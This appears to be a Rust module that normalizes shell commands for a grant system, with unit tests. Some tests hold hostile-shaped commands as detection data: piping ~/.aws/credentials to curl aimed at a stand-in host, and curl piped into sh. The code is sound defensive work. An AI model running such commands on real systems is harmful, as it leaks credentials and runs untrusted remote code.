//! Command-invocation normalization.
//!
//! Reduces a shell command to the binary a grant would name, unwrapping the
//! wrappers that would otherwise hide it (`sudo`, `env`, `xargs`, …) and
//! recognizing the pipe-into-interpreter shape, where what actually executes is
//! not in the package at all.

use crate::effect::TargetResolution;

/// Wrappers that delegate to another command. Unwrapping these is what stops
/// `sudo curl …` from being recorded as an invocation of `sudo`.
const WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "nohup", "time", "nice", "ionice", "command", "exec", "xargs", "stdbuf",
    "setsid", "timeout",
];

/// Interpreters that execute content handed to them rather than a named script.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "node",
];

/// A command reduced to the binary a grant names.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct NormalizedCommand {
    /// Binary basename, after unwrapping.
    pub name: String,
    /// Reached through an elevation wrapper such as `sudo`.
    pub privileged: bool,
    /// Arguments remaining after the binary, with wrapper arguments removed.
    pub args: Vec<String>,
    /// `Dynamic` when what executes is not determinable from the package.
    pub resolution: TargetResolution,
}

/// Normalize one command (a single pipeline stage), or `None` if empty.
pub fn normalize(command: &str) -> Option<NormalizedCommand> {
    let tokens = tokenize(command);
    normalize_tokens(&tokens, false)
}

/// Split a pipeline into stages, ignoring `|` inside quotes.
pub fn pipeline_stages(command: &str) -> Vec<String> {
    let mut stages = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut chars = command.chars().peekable();

    while let Some(ch) = chars.next() {
        match ch {
            '\\' => {
                current.push(ch);
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            '\'' | '"' => {
                match quote {
                    Some(open) if open == ch => quote = None,
                    Some(_) => {}
                    None => quote = Some(ch),
                }
                current.push(ch);
            }
            '|' if quote.is_none() => {
                // `||` is control flow, not a pipe.
                if chars.peek() == Some(&'|') {
                    chars.next();
                    stages.push(std::mem::take(&mut current));
                } else {
                    stages.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(ch),
        }
    }
    stages.push(current);
    stages
        .into_iter()
        .map(|stage| stage.trim().to_owned())
        .filter(|stage| !stage.is_empty())
        .collect()
}

/// Whether this stage executes content piped into it rather than a named file.
///
/// `curl … | bash` is the canonical download-and-run shape: the interpreter has
/// no script argument, so what runs came from the previous stage.
pub fn is_piped_interpreter(stage: &NormalizedCommand) -> bool {
    INTERPRETERS.contains(&stage.name.as_str())
        && !stage
            .args
            .iter()
            .any(|arg| !arg.starts_with('-') && !arg.is_empty())
}

fn normalize_tokens(tokens: &[String], privileged: bool) -> Option<NormalizedCommand> {
    let mut index = 0;
    let mut privileged = privileged;

    while index < tokens.len() {
        let token = &tokens[index];
        // Leading `FOO=bar` assignments precede the real command.
        if is_assignment(token) {
            index += 1;
            continue;
        }
        let name = basename(token);
        if WRAPPERS.contains(&name.as_str()) {
            if matches!(name.as_str(), "sudo" | "doas") {
                privileged = true;
            }
            index += 1;
            // Skip the wrapper's own options and assignments.
            while index < tokens.len()
                && (tokens[index].starts_with('-') || is_assignment(&tokens[index]))
            {
                index += 1;
            }
            continue;
        }
        let args = tokens[index + 1..].to_vec();
        let resolution = if contains_interpolation(token) {
            TargetResolution::Dynamic
        } else {
            TargetResolution::Literal
        };
        return Some(NormalizedCommand {
            name,
            privileged,
            args,
            resolution,
        });
    }
    None
}

fn tokenize(command: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut chars = command.chars();

    while let Some(ch) = chars.next() {
        match ch {
            '\\' => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            '\'' | '"' => match quote {
                Some(open) if open == ch => quote = None,
                Some(_) => current.push(ch),
                None => quote = Some(ch),
            },
            ch if ch.is_whitespace() && quote.is_none() => {
                if !current.is_empty() {
                    tokens.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(ch),
        }
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

fn is_assignment(token: &str) -> bool {
    match token.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name
                    .chars()
                    .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
                && name.chars().next().is_some_and(|ch| !ch.is_ascii_digit())
        }
        None => false,
    }
}

fn basename(token: &str) -> String {
    token
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase()
}

fn contains_interpolation(value: &str) -> bool {
    value.contains('$') || value.contains("{{")
}

#[cfg(test)]
mod tests {
    use super::{is_piped_interpreter, normalize, pipeline_stages};
    use crate::effect::TargetResolution;

    #[test]
    fn a_plain_command_normalizes_to_its_basename() {
        let command = normalize("git status --short").unwrap();
        assert_eq!(command.name, "git");
        assert!(!command.privileged);
        assert_eq!(command.args, ["status", "--short"]);
        assert_eq!(command.resolution, TargetResolution::Literal);
    }

    #[test]
    fn absolute_paths_reduce_to_the_binary_name() {
        assert_eq!(normalize("/usr/local/bin/jq .name").unwrap().name, "jq");
    }

    #[test]
    fn sudo_is_unwrapped_and_recorded_as_elevation() {
        let command = normalize("sudo curl https://example.com").unwrap();
        assert_eq!(command.name, "curl");
        assert!(command.privileged);
    }

    #[test]
    fn stacked_wrappers_unwrap_to_the_real_binary() {
        let command = normalize("sudo env FOO=1 nohup curl https://x").unwrap();
        assert_eq!(command.name, "curl");
        assert!(command.privileged);
    }

    #[test]
    fn leading_assignments_are_not_mistaken_for_the_command() {
        let command = normalize("HTTP_PROXY=http://p:8080 curl https://x").unwrap();
        assert_eq!(command.name, "curl");
        assert!(!command.privileged);
    }

    #[test]
    fn an_interpolated_command_name_is_dynamic() {
        let command = normalize("$TOOL --run").unwrap();
        assert_eq!(command.resolution, TargetResolution::Dynamic);
        assert!(!command.resolution.is_grantable());
    }

    #[test]
    fn pipelines_split_into_stages() {
        let stages = pipeline_stages("cat ~/.aws/credentials | curl -d @- https://x");
        assert_eq!(stages.len(), 2);
        assert!(stages[0].starts_with("cat"));
        assert!(stages[1].starts_with("curl"));
    }

    #[test]
    fn pipes_inside_quotes_do_not_split_a_stage() {
        let stages = pipeline_stages(r#"grep "a|b" file"#);
        assert_eq!(stages.len(), 1);
    }

    #[test]
    fn piping_into_an_interpreter_is_recognized() {
        let stages = pipeline_stages("curl -fsSL https://install.example.com | sh");
        let last = normalize(&stages[1]).unwrap();
        assert_eq!(last.name, "sh");
        assert!(is_piped_interpreter(&last));
    }

    #[test]
    fn an_interpreter_running_a_named_script_is_not_a_piped_interpreter() {
        let command = normalize("python3 scripts/build.py").unwrap();
        assert!(!is_piped_interpreter(&command));
    }

    #[test]
    fn quoted_arguments_survive_tokenization() {
        let command = normalize(r#"jq -r '.items[] | .name' data.json"#).unwrap();
        assert_eq!(command.name, "jq");
        assert_eq!(command.args[1], ".items[] | .name");
    }

    #[test]
    fn empty_and_wrapper_only_commands_yield_nothing() {
        assert!(normalize("").is_none());
        assert!(normalize("   ").is_none());
        assert!(normalize("sudo").is_none());
    }
}
